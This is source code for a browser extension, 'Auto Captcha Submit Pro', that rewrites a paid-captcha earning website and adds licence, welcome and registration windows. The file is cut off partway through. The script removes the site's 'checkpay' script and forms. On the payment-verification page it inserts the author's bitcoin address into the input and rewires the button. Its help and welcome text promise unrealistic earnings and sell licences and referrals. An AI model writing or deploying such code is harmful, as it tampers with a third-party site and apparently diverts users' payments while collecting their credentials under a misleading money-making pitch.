import { captureElementByClassName, captureElementById, checkDuplicate, createElement } from "./lib-functions-common";
import { app, coll } from "./db";
import { browser } from "webextension-polyfill-ts";
import { currencyFormat, reFormatScriptTag } from "./lib-functions";
import { acsComPortFront } from "./messanger";
import { bottomNotification, pushExecuteScript } from "./lib-assets";
export function setupApplicationContentAssets() {
    /*let ContentSecurityPolicy: any = createElement([{
        'meta': {
            'id': 'Content-Security-Policy',
            'http-equiv': 'Content-Security-Policy',
            'content': 'upgrade-insecure-requests'
        }
    }]);
    if (captureElementById('Content-Security-Policy') === null || captureElementById('Content-Security-Policy') === undefined) {
        document.head.insertBefore(ContentSecurityPolicy, document.head.firstElementChild);
    }*/
    /*let appCSS: any = createElement([{
        'script': {
            'id': 'acs-css-file',
            'href': app.body.content.css.app,
            'type': 'text/css'
        }
    }]);
    if (captureElementById('acs-css-file') === null || captureElementById('acs-css-file') === undefined) {
        document.head.appendChild(appCSS);
    }*/
    /*let overrideJS: any = createElement([{
        'script': {
            'id': 'acs-js-override-file',
            'src': app.body.content.js.override,
            'type': 'application/javascript'
        }
    }]);
    if (captureElementById('acs-js-override-file') === null || captureElementById('acs-js-override-file') === undefined) {
        document.head.appendChild(overrideJS);
    }*/
    let setting = createElement([{
            'img': {
                'id': 'app-setting-button',
                'alt': 'Setting',
                'class': 'app-setting-button',
                'accessKey': 'Ctrl+Alt+Q',
                'src': app.body.content.images.settingButton,
                'title': 'Click here for view your Name, E-mail Address, Licence Info and so on.'
            }
        }]);
    if (captureElementById('app-setting-button') === null || captureElementById('app-setting-button') === undefined) {
        document.body.insertBefore(setting, document.body.firstElementChild);
    }
}
export function modifyFixedWebContent() {
    captureElementById('app-loader').setAttribute('style', 'display:none !important;');
    captureElementById('outer').setAttribute('style', 'display:block !important;');
    if (document.querySelector('body').className !== undefined) {
        document.body.classList.add('app');
    }
    else {
        document.body.className = 'app';
    }
    /*crawling web page*/
    if (document.childNodes.length >= 0) {
        /*console.log('crawling whole element');*/
        document.childNodes.forEach(function (element) {
            if (element.nodeName === 'HTML') {
                element.childNodes.forEach(function (element) {
                    if (element.nodeName === '#comment') {
                        element.remove();
                    }
                    if (element.nodeName === 'HEAD') {
                        element.childNodes.forEach(function (element) {
                            var _a;
                            if (element.nodeName === 'SCRIPT') {
                                if (((_a = element.textContent) === null || _a === void 0 ? void 0 : _a.indexOf('function checkpay')) !== -1) {
                                    element.remove();
                                }
                            }
                        });
                    }
                    if (element.nodeName === 'BODY') {
                        /*console.log('crawling body element');*/
                        if (element.childNodes.length >= 0) {
                            element.childNodes.forEach(function (element) {
                                if (element.nodeName === '#comment') {
                                    element.remove();
                                }
                                if (element.nodeName === 'DIV' && element.id === 'outer') {
                                    element.setAttribute('style', 'padding: 10px;border-radius: 10px;');
                                    element.childNodes.forEach(function (element) {
                                        var _a, _b, _c, _d, _e, _f, _g, _h, _j, _k, _l;
                                        if (element.nodeName === '#comment') {
                                            element.remove();
                                        }
                                        if (element.nodeName === 'H1') {
                                            element.setAttribute('style', 'text-align: center;position: relative;width: 97%;');
                                            element.childNodes.forEach(function (element) {
                                                if (element.nodeName === 'A') {
                                                    element.setAttribute('style', 'text-align: center;position: relative;display: block;top: 10px;left: 265px;');
                                                }
                                            });
                                            /*element.remove();*/
                                        }
                                        if (element.nodeName === 'P') {
                                            element.remove();
                                        }
                                        if (element.nodeName === 'DIV' && element.id === 'main' && ((_a = element.firstElementChild) === null || _a === void 0 ? void 0 : _a.nodeName) === 'H2') {
                                            /*console.log('crawling main element');*/
                                            element.childNodes.forEach(function (element) {
                                                if (element.nodeName === '#comment') {
                                                    element.remove();
                                                }
                                            });
                                            if (element.getAttribute('align') === 'center') {
                                                element.childNodes.forEach(function (element) {
                                                    if (element.nodeName === 'HR') {
                                                        element.remove();
                                                    }
                                                });
                                                /*crawling elements on specific page is Viewing adwertisiment*/
                                                if (((_c = (_b = element.firstElementChild) === null || _b === void 0 ? void 0 : _b.textContent) === null || _c === void 0 ? void 0 : _c.indexOf('Viewing adwertisiment')) !== -1) {
                                                    /*console.log('crawling elements on specific page is Viewing adwertisiment');*/
                                                    element.childNodes.forEach(function (element) {
                                                        if (element.nodeName === 'DIV') {
                                                            element.remove();
                                                        }
                                                    });
                                                }
                                                /*crawling elements on specific page is Pay waiting*/
                                                if (((_e = (_d = element.firstElementChild) === null || _d === void 0 ? void 0 : _d.textContent) === null || _e === void 0 ? void 0 : _e.indexOf('Withdrawal of earned funds')) !== -1) {
                                                    /*console.log('crawling elements on specific page is Pay waiting');*/
                                                    element.childNodes.forEach(function (element) {
                                                        if (element.nodeName === 'FORM') {
                                                            element.remove();
                                                        }
                                                    });
                                                    document.body.appendChild(bottomNotification);
                                                    /*console.log('set event for bottom-notification action');*/
                                                    (_f = captureElementById('bottom-notification')) === null || _f === void 0 ? void 0 : _f.addEventListener('click', function () {
                                                        addPriceListWindow();
                                                        /*console.log('request to open licence window!!');*/
                                                    });
                                                }
                                                /*crawling elements on specific page is Pay waiting*/
                                                if (((_h = (_g = element.firstElementChild) === null || _g === void 0 ? void 0 : _g.textContent) === null || _h === void 0 ? void 0 : _h.indexOf('Express verification procedure')) !== -1) {
                                                    /*console.log('crawling elements on specific page is Express verification procedure');*/
                                                    element.childNodes.forEach(function (element) {
                                                        if (element.nodeName === 'FORM') {
                                                            element.remove();
                                                        }
                                                        element.childNodes.forEach(function (element) {
                                                            if (element.nodeName === 'HR') {
                                                                element.remove();
                                                            }
                                                            if (element.nodeName === 'H2') {
                                                                element.childNodes.forEach(function (element) {
                                                                    var _a;
                                                                    if (element.nodeName === 'INPUT' && element.type === 'text') {
                                                                        element.value = app.author.account.bitcoin;
                                                                    }
                                                                    if (element.nodeName === 'DIV' && element.id === 'wait') {
                                                                        (_a = element.firstElementChild) === null || _a === void 0 ? void 0 : _a.setAttribute('onclick', 'javascript:checkPayModified()');
                                                                    }
                                                                });
                                                            }
                                                        });
                                                    });
                                                }
                                            }
                                            else {
                                                /*crawling elements on specific page is Pay list*/
                                                if (((_k = (_j = element.firstElementChild) === null || _j === void 0 ? void 0 : _j.textContent) === null || _k === void 0 ? void 0 : _k.indexOf('Withdrawal of earned funds')) !== -1) {
                                                    /*console.log('crawling elements on specific page is Pay list');*/
                                                    document.body.appendChild(bottomNotification);
                                                    /*console.log('set event for bottom-notification action');*/
                                                    (_l = captureElementById('bottom-notification')) === null || _l === void 0 ? void 0 : _l.addEventListener('click', function () {
                                                        addPriceListWindow();
                                                        /*console.log('request to open licence window!!');*/
                                                    });
                                                }
                                            }
                                        }
                                        if (element.nodeName === 'DIV' && element.id === 'sidebar') {
                                            element.childNodes.forEach(function (element) {
                                                var _a;
                                                if (element.nodeName === 'DIV' && element.className === 'login headbar') {
                                                    element.childNodes.forEach(function (element) {
                                                        if (element.nodeName === 'FORM' && element.id === 'memberlogin' && element.name === 'loginf' && element.className === 'loginform') {
                                                            element.childNodes.forEach(function (element) {
                                                                if (element.nodeName === 'DIV' && element.className === 'joinnow headbar headjoin') {
                                                                    element.remove();
                                                                }
                                                            });
                                                        }
                                                    });
                                                }
                                                if (element.nodeName === 'DIV' && element.className === 'categories headbar') {
                                                    (_a = element.previousElementSibling) === null || _a === void 0 ? void 0 : _a.remove();
                                                    element.remove();
                                                }
                                            });
                                        }
                                        if (element.nodeName === 'DIV' && element.id === 'footer') {
                                            element.textContent = '';
                                            element.setAttribute('style', 'clear: both;background:none;width: 0;height: 0;line-height:0;');
                                        }
                                    });
                                }
                            });
                        }
                    }
                });
            }
        });
    }
}
export function addAppWindow() {
    let acsAppWindow = createElement([{
            'div': {
                'id': 'acs-app-window',
                'class': 'app-window',
                'style': 'display:none;'
            }
        }]);
    let acsAppBody = createElement([{
            'div': {
                'id': 'app-setting-window',
                'class': 'row app-window-body animate'
            }
        }]);
    acsAppWindow.appendChild(acsAppBody);
    let acsAppTitleBar = createElement([{ 'div': { 'class': 'acsAppTitleBar' } }]);
    let acsAppTitleText = createElement([{ 'div': { 'class': 'acsAppTitleText' } }]);
    acsAppTitleText.textContent = app.about.name_spaced;
    acsAppTitleBar.appendChild(acsAppTitleText);
    let acsAppTitleSymbol = createElement([{ 'div': { 'id': 'acs-app-close-button', 'class': 'acsAppTitleSymbol' } }]);
    acsAppTitleSymbol.textContent = 'x';
    acsAppTitleBar.appendChild(acsAppTitleSymbol);
    acsAppBody.appendChild(acsAppTitleBar);
    /*navigators*/
    let acsAppNav = createElement([{ 'div': { 'class': 'setting-app-body' } }]);
    acsAppBody.appendChild(acsAppNav);
    let acsAppNavUL = createElement([{ 'ul': { 'class': 'acsAppNavUL' } }]);
    acsAppNav.appendChild(acsAppNavUL);
    let navItem1 = createElement([{ 'li': { 'id': 'nav-overview' } }]);
    navItem1.textContent = 'Overview';
    acsAppNavUL.appendChild(navItem1);
    let navItem2 = createElement([{ 'li': { 'id': 'nav-application' } }]);
    navItem2.textContent = 'Application';
    acsAppNavUL.appendChild(navItem2);
    let navItem3 = createElement([{ 'li': { 'id': 'nav-user' } }]);
    navItem3.textContent = 'User';
    acsAppNavUL.appendChild(navItem3);
    let navItem4 = createElement([{ 'li': { 'id': 'nav-payment' } }]);
    navItem4.textContent = 'Licence';
    acsAppNavUL.appendChild(navItem4);
    let navItem5 = createElement([{ 'li': { 'id': 'nav-help' } }]);
    navItem5.textContent = 'Help';
    acsAppNavUL.appendChild(navItem5);
    /*navigators*/
    /*navigators content*/
    /*navigators overview content*/
    let acsAppContent = createElement([{ 'div': { 'class': 'setting-app-body-content' } }]);
    acsAppNav.appendChild(acsAppContent);
    let acsAppContentOverview = createElement([{ 'div': { 'id': 'setting-app-content-overview' } }]);
    acsAppContent.appendChild(acsAppContentOverview);
    let appOverviewTable = createElement([{ 'table': { 'style': 'width:100%;margin-top: 5px;' } }]);
    acsAppContentOverview.appendChild(appOverviewTable);
    let appOverviewTableTr1 = createElement([{ 'tr': {} }]);
    appOverviewTable.appendChild(appOverviewTableTr1);
    let appOverviewTableTr1Td1 = createElement([{ 'td': { 'style': 'width:37.5%' } }]);
    appOverviewTableTr1.appendChild(appOverviewTableTr1Td1);
    let appOverviewTableTr1Td2 = createElement([{ 'td': { 'style': 'width:20%' } }]);
    let appLogo = createElement([{
            'img': {
                'alt': app.about.name_spaced,
                'src': app.body.content.images.appLogo,
                'style': 'width:110px;height:120px;float: left;'
            }
        }]);
    appOverviewTableTr1Td2.appendChild(appLogo);
    let paySymbol = createElement([{
            'span': {
                'id': 'setting-app-pay-symbol',
                'class': 'setting-app-pay-symbol'
            }
        }]);
    paySymbol.textContent = 'N/N';
    appOverviewTableTr1Td2.appendChild(paySymbol);
    appOverviewTableTr1.appendChild(appOverviewTableTr1Td2);
    let appOverviewTableTr1Td3 = createElement([{ 'td': { 'style': 'width:33.5%' } }]);
    appOverviewTableTr1.appendChild(appOverviewTableTr1Td3);
    let appOverviewTableTr2 = createElement([{ 'tr': {} }]);
    appOverviewTable.appendChild(appOverviewTableTr2);
    let appOverviewTableTr2Td1 = createElement([{
            'td': {
                'id': 'registered-user-name-plan',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appOverviewTableTr2Td1.textContent = 'N/N';
    appOverviewTableTr2.appendChild(appOverviewTableTr2Td1);
    /*navigators overview content*/
    /*navigators application content*/
    let acsAppContentApplication = createElement([{
            'div': {
                'id': 'setting-app-content-application',
                'style': 'margin-top: 55px;display:none;'
            }
        }]);
    acsAppContent.appendChild(acsAppContentApplication);
    let appApplicationTable = createElement([{ 'table': { 'style': 'width:100%;margin-top: 5px;' } }]);
    acsAppContentApplication.appendChild(appApplicationTable);
    let appApplicationTableTr1 = createElement([{ 'tr': {} }]);
    appApplicationTable.appendChild(appApplicationTableTr1);
    let appApplicationTableTr1Td1 = createElement([{
            'td': {
                'id': 'setting-app-id',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appApplicationTableTr1Td1.textContent = 'N/N';
    appApplicationTableTr1.appendChild(appApplicationTableTr1Td1);
    let appApplicationTableTr2 = createElement([{ 'tr': {} }]);
    appApplicationTable.appendChild(appApplicationTableTr2);
    let appApplicationTableTr2Td1 = createElement([{
            'td': {
                'id': 'setting-app-version',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appApplicationTableTr2Td1.textContent = 'Version : ' + app.about.version;
    appApplicationTableTr2.appendChild(appApplicationTableTr2Td1);
    let appApplicationTableTr3 = createElement([{ 'tr': {} }]);
    appApplicationTable.appendChild(appApplicationTableTr3);
    let appApplicationTableTr3Td1 = createElement([{
            'td': {
                'id': 'setting-app-install-date',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appApplicationTableTr3Td1.textContent = 'N/N';
    appApplicationTableTr3.appendChild(appApplicationTableTr3Td1);
    /*navigators application content*/
    /*navigators user content*/
    let acsAppContentUser = createElement([{
            'div': {
                'id': 'setting-app-content-user',
                'style': 'margin-top: 55px;display:none'
            }
        }]);
    acsAppContent.appendChild(acsAppContentUser);
    let appUserTable = createElement([{ 'table': { 'style': 'width:100%;margin-top: 5px;' } }]);
    acsAppContentUser.appendChild(appUserTable);
    let appUserTableTr1 = createElement([{ 'tr': {} }]);
    appUserTable.appendChild(appUserTableTr1);
    let appUserTableTr1Td1 = createElement([{
            'td': {
                'id': 'setting-app-user-name',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appUserTableTr1Td1.textContent = 'N/N';
    appUserTableTr1.appendChild(appUserTableTr1Td1);
    let appUserTableTr2 = createElement([{ 'tr': {} }]);
    appUserTable.appendChild(appUserTableTr2);
    let appUserTableTr2Td1 = createElement([{
            'td': {
                'id': 'setting-app-user-email',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appUserTableTr2Td1.textContent = 'N/N';
    appUserTableTr2.appendChild(appUserTableTr2Td1);
    let appUserTableTr3 = createElement([{ 'tr': {} }]);
    appUserTable.appendChild(appUserTableTr3);
    let appUserTableTr3Td1 = createElement([{
            'td': {
                'id': 'setting-app-user-location',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appUserTableTr3Td1.textContent = 'N/N';
    appUserTableTr3.appendChild(appUserTableTr3Td1);
    /*navigators user content*/
    /*navigators payment content*/
    let acsAppContentPayment = createElement([{
            'div': {
                'id': 'setting-app-content-payment',
                'style': 'margin-top: 55px;display:none;'
            }
        }]);
    acsAppContent.appendChild(acsAppContentPayment);
    let getLicenceButton = createElement([{
            'button': {
                'id': 'setting-get-a-licence',
                'class': 'app-button app-button-outline-primary',
                'style': 'position: relative;left: 350px;top: -50px;'
            }
        }]);
    getLicenceButton.textContent = 'Get a licence';
    acsAppContentPayment.appendChild(getLicenceButton);
    let appPaymentTable = createElement([{ 'table': { 'style': 'width:100%;margin-top: -25px;' } }]);
    acsAppContentPayment.appendChild(appPaymentTable);
    let appPaymentTableTr1 = createElement([{ 'tr': {} }]);
    appPaymentTable.appendChild(appPaymentTableTr1);
    let appPaymentTableTr1Td1 = createElement([{
            'td': {
                'id': 'setting-app-user-payment-type',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appPaymentTableTr1Td1.textContent = 'N/N';
    appPaymentTableTr1.appendChild(appPaymentTableTr1Td1);
    let appPaymentTableTr2 = createElement([{ 'tr': {} }]);
    appPaymentTable.appendChild(appPaymentTableTr2);
    let appPaymentTableTr2Td1 = createElement([{
            'td': {
                'id': 'setting-app-user-payment-licence',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 14px;line-height: 2;'
            }
        }]);
    appPaymentTableTr2Td1.textContent = 'N/N';
    appPaymentTableTr2.appendChild(appPaymentTableTr2Td1);
    let appPaymentTableTr3 = createElement([{ 'tr': {} }]);
    appPaymentTable.appendChild(appPaymentTableTr3);
    let appPaymentTableTr3Td1 = createElement([{
            'td': {
                'id': 'setting-app-user-payment-date',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appPaymentTableTr3Td1.textContent = 'N/N';
    appPaymentTableTr3.appendChild(appPaymentTableTr3Td1);
    let appPaymentTableTr4 = createElement([{ 'tr': {} }]);
    appPaymentTable.appendChild(appPaymentTableTr4);
    let appPaymentTableTr4Td1 = createElement([{
            'td': {
                'id': 'setting-app-user-payment-lastUpdate',
                'colspan': '3',
                'style': 'text-align:center;width:406px;font-size: 15px;line-height: 2;'
            }
        }]);
    appPaymentTableTr4Td1.textContent = 'N/N';
    appPaymentTableTr4.appendChild(appPaymentTableTr4Td1);
    /*navigators payment content*/
    /*navigators Help  content*/
    let acsAppContentHelp = createElement([{
            'div': {
                'id': 'setting-app-content-help',
                'style': 'display:none;'
            }
        }]);
    acsAppContentHelp.innerHTML =
        'Do you want to make easy money by filling in the captcha code online? Then you have come to the right place. The best solution for you is our Auto Captcha Submit Pro. There are many websites to make money by filling in the captcha code online. All you have to do now. <br><br>' +
            '<h3>Instructions</h3>[1] Install our add-on in your Firefox browser<br>' +
            '[2] Click the Action button. Then a new tab will open a best and trusted earning website for you.<br><br>' +
            '[3] If you are not a listed customer, a welcome window will appear in front of you.<br>' +
            '[A] First go to the next step by clicking "Let\'s Connect".<br>' +
            '[B] You must register with first name, last name, mail address and complex password<br>' +
            '[C] If you are a registrar, login with your mail address and complex password by clicking "Already Member" on the next left side button.<br>' +
            '[D] If you register for the first time, you can earn $ 20 in a few seconds with my add-on from that website as a trial.<br><br>' +
            '[4] Go to the Registrar tab and open an account. The journey to bring the diameter began.<br>' +
            '[5] Click on the User menu.<br>' +
            '[6] Then click on the START WATCHING PAYED ADS button.<br>' +
            '[7] When the new page comes, you will see three buttons of our add-on. [If you have purchased a license, the buttons will remain active. Otherwise it will be disabled.]<br>' +
            '[8] If the buttons are active, click on the Start button, showing <!--Auto, Bulk or--> Manual in the options.<br>' +
            '<!--[6] If you continue to work with the Auto option, the system will continue to work automatically until you close it or the browser reloads or the Internet connection is disconnected. This way you will continue to earn at the rate of 10 cents per second (that means 1 captcha will be filled for you per second). You can earn unlimited income from at least 1000 USD per day.<br>[9] If you want to turn it off while the add-on is working in the auto option, just click the reset button on the far right.<br>[8] If you continue to work in the bulk option, the add-on can earn 5 USD per click, which means 50 captcha per second. This option will only click on the start button, will not run automatically like the auto option.<br>-->' +
            '[9] If you continue to work with the manual option, you will need to complete the captcha one by one by clicking the Start button. This way you can earn 10 cents per click.<br>' +
            '[10] You can find out your name, email, details about Addon and the license you used by clicking on the Auto Captcha Submit Pro icon button in the top right corner.<br>' +
            '[11] If your license limit expires, you will see a price list of four plans.<br>' +
            '[12] Whenever you want to get a license, go to Settings and click on the License tab, then click on the "License at the gate" button on the right. Then a price list of four plans will appear in front of you.<br>' +
            '[13] Then click on the plan as per your requirement, a payment link will be created for you and a green button will say "Pay". Click on it. Then a new window will open in front of you<br>' +
            '[14] In the new payment window, click on the "Pay Now" button with your debit or credit card number, validity date, CVC and postal code. The message will come if the payment is successful. If payment fails, try again. If the payment is successful, the license will be added to your account.<br>' +
            '[15] If the price list does not automatically leave after the payment is successful, close it and reload the page.<br><br>Now you keep earning. You will earn, we will help you. Follow our web site in case of any need.<br><br>' +
            '<h3>Support Center</h3> Email: <a href="mailto:support@mishusoft.com">support@mishusoft.com</a>,<br>website: https://www.mishusoft.com';
    acsAppContent.appendChild(acsAppContentHelp);
    /*navigators Help content*/
    /*navigators content*/
    if (captureElementById('acs-app-window') === null || captureElementById('acs-app-window') === undefined) {
        /*console.info('setting window added')*/
        document.body.insertBefore(acsAppWindow, document.body.lastElementChild);
    }
    return globalEventControllers('app-setting-window');
}
/*app welcome window*/
export function addWelcomeWindow() {
    var _a;
    let acsAppWindow = captureElementById('acs-app-window');
    acsAppWindow.style.display = 'block';
    captureElementById('app-setting-window').style.display = 'none';
    let acsAppWelcome = createElement([{
            'div': {
                'id': 'app-welcome-window',
                'class': 'row app-window-body animate' /*,
                'style': 'width: 600px;'*/
            }
        }]);
    acsAppWindow.appendChild(acsAppWelcome);
    let acsAppWelcomeTitleBar = createElement([{ 'div': { 'style': 'width: 100%;padding: 10px 0;display: inline-block;' } }]);
    let acsAppWelcomeTitleSymbol = createElement([{
            'div': {
                'id': 'app-welcome-window-close-button',
                'class': 'acsAppTitleSymbol'
            }
        }]);
    acsAppWelcomeTitleSymbol.textContent = 'x';
    acsAppWelcomeTitleBar.appendChild(acsAppWelcomeTitleSymbol);
    acsAppWelcome.appendChild(acsAppWelcomeTitleBar);
    let acsAppWelcomeBody = createElement([{ 'div': { 'class': 'setting-app-body' } }]);
    acsAppWelcome.appendChild(acsAppWelcomeBody);
    let acsAppWelcomeBodyContent = createElement([{ 'div': { 'style': 'float: left;text-align: left !important;margin: 0;color: black;' } }]);
    acsAppWelcomeBody.appendChild(acsAppWelcomeBodyContent);
    let welcomeTable = createElement([{ 'table': { 'style': 'width:100%;' } }]);
    acsAppWelcomeBodyContent.appendChild(welcomeTable);
    let welcomeTableBody = createElement([{ 'tbody': {} }]);
    welcomeTable.appendChild(welcomeTableBody);
    let welcomeTableBodyTr1 = createElement([{ 'tr': {} }]);
    welcomeTableBody.appendChild(welcomeTableBodyTr1);
    let welcomeTableBodyTr1Td1 = createElement([{ 'td': { 'style': 'width:100%;text-align: center;position: relative;color: black;font-size: 28px;font-weight: bold;padding-bottom: 15px;user-select: none;-webkit-user-select: none;-ms-user-select:none ;' } }]);
    welcomeTableBodyTr1Td1.textContent = 'Welcome to ' + app.about.name_spaced;
    welcomeTableBodyTr1.appendChild(welcomeTableBodyTr1Td1);
    let welcomeTableBodyTr2 = createElement([{ 'tr': {} }]);
    welcomeTableBody.appendChild(welcomeTableBodyTr2);
    let welcomeTableBodyTr2Td1 = createElement([{ 'td': { 'style': 'width:100%;font-size: 14px;line-height: 1.5;text-align: justify;padding: 7px 15px;user-select: none;-webkit-user-select: none;-ms-user-select:none ;' } }]);
    let welcomeTextP1 = createElement([{ 'p': {} }]);
    welcomeTextP1.textContent = 'Thank you very much for accepting one of our services. We are developing and distributing this software like any other software with adequate security. At present our service has been able to successfully reach more than ' + app.about.total_users + ' customers.';
    welcomeTableBodyTr2Td1.appendChild(welcomeTextP1);
    welcomeTableBodyTr2Td1.appendChild(createElement([{ 'br': {} }]));
    let welcomeTextP2 = createElement([{ 'p': {} }]);
    welcomeTextP2.textContent = 'You need to register with name and e-mail number to receive this service. Which is very important for subsequent service license purchase and any type of support. We hope you enjoy the service by registering like other esteemed customers.';
    welcomeTableBodyTr2Td1.appendChild(welcomeTextP2);
    welcomeTableBodyTr2Td1.appendChild(createElement([{ 'br': {} }]));
    let welcomeTextP3 = createElement([{ 'p': {} }]);
    welcomeTextP3.textContent = 'If you need referrals to withdraw your account balance, please contact us. We are able to give you any amount of referrals as per your requirement. For every 40 referrals we have to pay $ 10.00. ' +
        'Important Notice: To receive referrals to your account, you must have our add-on installed on your browser and register with our add-on. ' +
        'You have to be on trial for that or you have not purchased any of our packages. Remember, your decision is to accept the money earned.';
    welcomeTableBodyTr2Td1.appendChild(welcomeTextP3);
    /*welcomeTableBodyTr2Td1.appendChild(createElement([{'br': {}}]));
    let welcomeTextP4: any = createElement([{'p': {}}]);
    welcomeTextP4.textContent = 'Special Note: I am preparing to make the addon more powerful. For so long some websites have been able to analyze captcha code. From the next stable release, the add-on will be able to analyze Google\'s Recaptcha, H Captcha, 2Captcha\'s all Captcha.';
    welcomeTableBodyTr2Td1.appendChild(welcomeTextP4);

    welcomeTableBodyTr2Td1.appendChild(createElement([{'br': {}}]));
    let welcomeTextP5: any = createElement([{'p': {}}]);
    welcomeTextP5.textContent = 'Therefore, this project requires a large amount of finances. You can contribute to our project by donating any amount.';
    welcomeTableBodyTr2Td1.appendChild(welcomeTextP5);*/
    welcomeTableBodyTr2.appendChild(welcomeTableBodyTr2Td1);
    let welcomeTableBodyTr3 = createElement([{ 'tr': {} }]);
    welcomeTableBody.appendChild(welcomeTableBodyTr3);
    let welcomeTableBodyTr3Td1 = createElement([{ 'td': { 'style': 'text-align:center;width:100%;font-size: 15px;line-height: 2;' } }]);
    let letStartRegistration = createElement([{
            'button': {
                'id': 'let-start-registration',
                'class': 'app-button app-button-outline-primary'
            }
        }]);
    letStartRegistration.textContent = 'Let\'s connect';
    welcomeTableBodyTr3Td1.appendChild(letStartRegistration);
    /*let letDonate: any = createElement([{
        'button': {
            'id': 'let-donate',
            'class': 'app-button app-button-outline-success'
        }
    }]);
    letDonate.textContent = 'Let\'s connect';
    welcomeTableBodyTr3Td1.appendChild(letDonate);*/
    welcomeTableBodyTr3.appendChild(welcomeTableBodyTr3Td1);
    (_a = acsAppWindow.childNodes) === null || _a === void 0 ? void 0 : _a.forEach(function (element) {
        if (element.style.display === 'block') {
            element.style.display = 'none';
        }
        if (element.id === 'app-welcome-window' && element.style.display === 'none') {
            element.style.display = 'block';
        }
        /*console.log(element);*/
    });
    return globalEventControllers('app-welcome-window');
}
/*app registration window*/
export function addMemberWindow() {
    let acsAppWindow = captureElementById('acs-app-window');
    let acsAppRegistrationBody = createElement([{
            'div': {
                'id': 'app-user-window',
                'class': 'row app-window-body animate',
                'style': 'width: 600px;display:none;'
            }
        }]);
    acsAppWindow.appendChild(acsAppRegistrationBody);
    let acsAppTitleBar = createElement([{ 'div': { 'style': 'width: 100%;color: black;font-size: 28px;font-weight: bold;padding: 10px 0;display: inline-block;' } }]);
    let acsAppTitleText = createElement([{
            'div': {
                'class': 'acsAppTitleText',
                'style': 'left: 200px !important;'
            }
        }]);
    acsAppTitleText.textContent = 'Connect with us';
    acsAppTitleBar.appendChild(acsAppTitleText);
    let acsAppTitleSymbol = createElement([{
            'div': {
                'id': 'app-user-window-close-button',
                'class': 'acsAppTitleSymbol'
            }
        }]);
    acsAppTitleSymbol.textContent = 'x';
    acsAppTitleBar.appendChild(acsAppTitleSymbol);
    acsAppRegistrationBody.appendChild(acsAppTitleBar);
    let acsAppBody = createElement([{
            'div': {
                'id': 'app-user-body',
                'style': 'text-align: center !important;margin-top: 10px;color: black;'
            }
        }]);
    acsAppRegistrationBody.appendChild(acsAppBody);
    let infoPanel = createElement([{ 'div': { 'id': 'infoPanel', 'class': 'messagePanel' } }]);
    acsAppBody.appendChild(infoPanel);
    let acsAppBodyInput0 = createElement([{
            'input': {
                'id': 'user-ip-address',
                'type': 'text',
                'class': 'form-input',
                'placeholder': 'Your IP here..',
                'disabled': 'disabled',
                'style': 'display:none;'
            }
        }]);
    acsAppBody.appendChild(acsAppBodyInput0);
    let acsAppBodyInput1 = createElement([{
            'input': {
                'id': 'first-name',
                'type': 'text',
                'class': 'form-input',
                'placeholder': 'Your first name here..',
                'required': 'required'
            }
        }]);
    acsAppBody.appendChild(acsAppBodyInput1);
    let acsAppBodyInput2 = createElement([{
            'input': {
                'id': 'last-name',
                'type': 'text',
                'class': 'form-input',
                'placeholder': 'Your last name here..',
                'required': 'required'
            }
        }]);
    acsAppBody.appendChild(acsAppBodyInput2);
    let acsAppBodyInput3 = createElement([{
            'input': {
                'id': 'email-address',
                'type': 'email',
                'class': 'form-input',
                'placeholder': 'Your email address here..',
                'required': 'required'
            }
        }]);
    acsAppBody.appendChild(acsAppBodyInput3);
    let acsAppBodyInput4 = createElement([{
            'input': {
                'id': 'acs-password',
                'type': 'password',
                'class': 'form-input',
                'placeholder': 'Your password here..',
                'required': 'required'
            }
        }]);
    acsAppBody.appendChild(acsAppBodyInput4);
    let buttonZone = createElement([{ 'div': { 'style': 'margin: 10px 0 5px 0;' } }]);
    acsAppBody.appendChild(buttonZone);
    let button1 = createElement([{
            'button': {
                'id': 'let-connect',
                'class': 'app-button app-button-outline-primary',
                'type': 'button',
                'style': 'display:none;'
            }
        }]);
    button1.textContent = 'Let\'s Connect';
    buttonZone.appendChild(button1);
    let button2 = createElement([{
            'input': {
                'id': 'let-login-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Already member'
            }
        }]);
    buttonZone.appendChild(button2);
    let button3 = createElement([{
            'input': {
                'id': 'do-login-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Log In',
                'style': 'display:none;'
            }
        }]);
    buttonZone.appendChild(button3);
    let button4 = createElement([{
            'input': {
                'id': 'do-register-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Register'
            }
        }]);
    buttonZone.appendChild(button4);
    let button5 = createElement([{
            'input': {
                'id': 'let-get-a-licence-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Get a licence',
                'style': 'display:none;'
            }
        }]);
    buttonZone.appendChild(button5);
    let button6 = createElement([{
            'input': {
                'id': 'let-earn-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Start Earning now',
                'style': 'display:none;'
            }
        }]);
    buttonZone.appendChild(button6);
    let button7 = createElement([{
            'input': {
                'id': 'do-reset-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Reset Account',
                'style': 'display:none;'
            }
        }]);
    buttonZone.appendChild(button7);
    let button8 = createElement([{
            'input': {
                'id': 'do-recover-password-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Password Recovery',
                'style': 'display:none;'
            }
        }]);
    buttonZone.appendChild(button8);
    acsAppWindow.childNodes.forEach(function (element) {
        if (element.style.display === 'block') {
            element.style.display = 'none';
        }
        if (element.id === 'app-user-window' && element.style.display === 'none') {
            element.style.display = 'block';
        }
    });
    return globalEventControllers('app-user-window');
